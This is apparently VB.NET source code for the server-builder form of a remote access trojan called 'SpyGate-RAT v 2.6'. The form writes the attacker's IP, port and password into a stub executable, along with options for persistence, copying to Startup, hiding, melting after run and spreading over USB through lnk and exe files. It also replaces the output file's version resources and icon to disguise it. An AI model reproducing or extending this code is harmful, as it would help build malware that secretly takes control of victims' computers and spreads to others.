Imports System.IO
Imports System.CodeDom.Compiler
Imports System.Runtime.InteropServices
Imports System.Security

'####################################################################################
'### Coded By Umbrella-Win7 - OsamaCoder#############################################
'### في ذمتك إلين يوم القيامة إذا لم تذكر حقوقي فلن أسامحك إلين يوم القيامة #
'####################################################################################

Public Class Form3
    Dim Stub, text1, text2 As String
    Const spl = "abccba"

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        TextBox3.Text = RandomVariable(20, 30)
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            TextBox7.UseSystemPasswordChar = False
        Else
            TextBox7.UseSystemPasswordChar = True
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        ListBox1.Items.Clear()
        Dim s As New SaveFileDialog
        s.Filter = "Excutable *.exe | *.exe"
        s.FileName = TextBox9.Text
        If s.ShowDialog = DialogResult.OK Then
            text1 = TextBox1.Text
            text2 = TextBox2.Text
            ProgressBar1.Value = 20
        End If
        FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        Stub = Space(LOF(1))
        FileGet(1, Stub)
        FileClose(1) ' Coded By : Umbrella-Win7
        FileOpen(1, s.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, Stub & spl & text1 & spl & text2 & spl & TextBox5.Text & spl & CheckBox1.CheckState & spl & TextBox4.Text & spl & CheckBox2.CheckState & spl _
               & TextBox6.Text & spl & CheckBox3.CheckState & spl & TextBox7.Text & spl & CheckBox5.CheckState & spl & CheckBox6.CheckState & spl & CheckBox7.CheckState & spl & CheckBox8.CheckState _
               & spl & CheckBox9.CheckState & spl & CheckBox10.CheckState & spl & CheckBox11.CheckState & spl & CheckBox12.CheckState & spl & TextBox3.Text & spl & CheckBox13.CheckState & spl & TextBox10.Text & spl & CheckBox2.CheckState & spl & ComboBox1.Text & spl & CheckBox15.CheckState & spl & dta.Checked & spl & css.Checked & spl & tcs.Text & spl & TextBox9.Text & _
                spl & flder.Text & spl & hidme.CheckState & spl & melt.CheckState & spl & Install.temp1.Checked & spl & Install.temp2.Checked & spl & Install.tr1.Text & spl & Install.sys1.Checked & spl & Install.sys2.Checked & spl _
                & Install.tr2.Text & spl & CheckBox25.CheckState & spl & CheckBox16.CheckState & spl & CheckBox17.CheckState & spl & CheckBox18.CheckState & spl _
                & CheckBox19.CheckState & spl & CheckBox20.CheckState & spl & CheckBox21.CheckState & spl & CheckBox22.CheckState & spl & CheckBox23.CheckState & spl _
                & CheckBox24.CheckState & spl & CheckBox26.CheckState)
        ProgressBar1.Value = 60
        FileClose(1)
        ProgressBar1.Value = 70
        System.IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
        Dim Version = New Collections.Generic.Dictionary(Of String, String) : Version.Add("CompilerVersion", "v3.4")
        Dim Compiler As VBCodeProvider = New VBCodeProvider(Version)
        Dim cResults As CompilerResults
        Dim Options As New CompilerParameters()
        With Options
            .GenerateExecutable = True
            .OutputAssembly = Application.StartupPath & "\AssemblyChange.exe"
            .CompilerOptions = "/target:winexe"
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .MainClass = "X"
        End With
        Dim otherfile As String = Application.StartupPath & "\AssemblyChange.exe"
        Dim resfile As String = Application.StartupPath & "\assemblychange.res"
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -extract " & otherfile & "," & resfile & ",VERSIONINFO,,", AppWinStyle.Hide)
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -delete " & s.FileName & "," & System.AppDomain.CurrentDomain.BaseDirectory() + "res.exe" & ",VERSIONINFO,,", AppWinStyle.Hide)
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & s.FileName & "," & s.FileName & "," & resfile & ",VERSIONINFO,1,", AppWinStyle.Hide)
        If Not PictureBox1.Image Is Nothing Then
            Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & s.FileName & ", " & s.FileName & ", " & PictureBox1.Tag.ToString & ", " & "icongroup, 1,0", AppWinStyle.Hide)
            'Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & sfd.FileName & ", " & sfd.FileName & ", " & Application.StartupPath & "\ico.ico, icongroup, 1,0", AppWinStyle.Hide)
        End If
        Try
B:
            If File.Exists(Application.StartupPath & "\AssemblyChange.exe") Then File.Delete(Application.StartupPath & "\AssemblyChange.exe")
            If File.Exists(Application.StartupPath & "\assemblychange.res") Then File.Delete(Application.StartupPath & "\assemblychange.res")
            If File.Exists(Application.StartupPath & "\res.exe") = True Then File.Delete(Application.StartupPath & "\res.exe")
            If File.Exists(Application.StartupPath & "\res.log") = True Then File.Delete(Application.StartupPath & "\res.log")
            If File.Exists(Application.StartupPath & "\res.ini") = True Then File.Delete(Application.StartupPath & "\res.ini")
        Catch
            GoTo B
        End Try
        ProgressBar1.Value = 94
        If TextBox9.Text = "" Then
        End If
        ProgressBar1.Value = 100
        ListBox1.Items.Add("1- IP : " & TextBox1.Text)
        ListBox1.Items.Add("2- Port : " & TextBox2.Text)
        ListBox1.Items.Add("3- ID : " & TextBox5.Text)
        ListBox1.Items.Add("4- Connection Password : " & TextBox7.Text)
        ListBox1.Items.Add("5- Folder Name : " & flder.Text)
        ListBox1.Items.Add("6- EXE Name : " & TextBox9.Text)
        If css.Checked = True Then
            ListBox1.Items.Add("7- Apllication Data Folder Checked In : " & tcs.Text)
        Else
            ListBox1.Items.Add("7- Apllication Data Folder Checked In : None")
        End If
        If Install.temp2.Checked = True Then
            ListBox1.Items.Add("8- Templates Folder Checked In : " & Install.tr1.Text)
        Else
            ListBox1.Items.Add("8- Templates Folder Folder Checked In : None")
        End If
        If Install.sys2.Checked = True Then
            ListBox1.Items.Add("9- Programs Folder Checked In : " & Install.tr1.Text)
        Else
            ListBox1.Items.Add("9- Programs Folder Folder Checked In : None")
        End If
        If melt.Checked = True Then
            ListBox1.Items.Add("10- Melt After Run : True")
        Else
            ListBox1.Items.Add("10- Melt After Run : False")
        End If
        If hidme.Checked = True Then
            ListBox1.Items.Add("11- Hide After Run : True")
        Else
            ListBox1.Items.Add("11- Hide After Run : False")
        End If
        If CheckBox13.Checked = True Then
            ListBox1.Items.Add("12- Persistence : True")
        Else
            ListBox1.Items.Add("12- Persistence : False")
        End If
        If CheckBox2.Checked = True Then
            ListBox1.Items.Add("13- Copy To Folder Startup : True / " & TextBox6.Text)
        Else
            ListBox1.Items.Add("13- Copy To Folder Startup : False")
        End If
        If CheckBox6.Checked = True Then
            ListBox1.Items.Add("14- USB Spread / lnk : True")
        Else
            ListBox1.Items.Add("14- USB Spread / lnk : False")
        End If
        If CheckBox25.Checked = True Then
            ListBox1.Items.Add("15- USB Spread / exe : True")
        Else
            ListBox1.Items.Add("15- USB Spread / exe : False")
        End If
        MessageBox.Show("Server Was Created Successfully", "SpyGate-RAT v 2.6", MessageBoxButtons.OK, MessageBoxIcon.Information)
        ProgressBar1.Value = 0
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Icon File (*.ico) |*.ico"}
        If ofd.ShowDialog = DialogResult.OK Then
            PictureBox1.Image = Image.FromFile(ofd.FileName) : PictureBox1.Tag = ofd.FileName
        End If
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Install.ShowDialog()
    End Sub

    Private Sub Form3_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub css_CheckedChanged(sender As Object, e As EventArgs) Handles css.CheckedChanged
        If css.Checked = True Then
            Install.temp2.Checked = False
            Install.sys2.Checked = False
        Else

        End If
    End Sub

    Private Sub CheckBox27_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox27.CheckedChanged
        If CheckBox27.Checked Then
            CheckBox5.Checked = True
            CheckBox7.Checked = True
            CheckBox8.Checked = True
            CheckBox9.Checked = True
            CheckBox10.Checked = True
            CheckBox11.Checked = True
            CheckBox15.Checked = True
            CheckBox16.Checked = True
            CheckBox17.Checked = True
            CheckBox18.Checked = True
            CheckBox19.Checked = True
            CheckBox20.Checked = True
            CheckBox21.Checked = True
            CheckBox22.Checked = True
            CheckBox23.Checked = True
            CheckBox24.Checked = True
            CheckBox26.Checked = True
        Else
            CheckBox5.Checked = False
            CheckBox7.Checked = False
            CheckBox8.Checked = False
            CheckBox9.Checked = False
            CheckBox10.Checked = False
            CheckBox11.Checked = False
            CheckBox15.Checked = False
            CheckBox16.Checked = False
            CheckBox17.Checked = False
            CheckBox18.Checked = False
            CheckBox19.Checked = False
            CheckBox20.Checked = False
            CheckBox21.Checked = False
            CheckBox22.Checked = False
            CheckBox23.Checked = False
            CheckBox24.Checked = False
            CheckBox26.Checked = False
        End If
    End Sub
End Class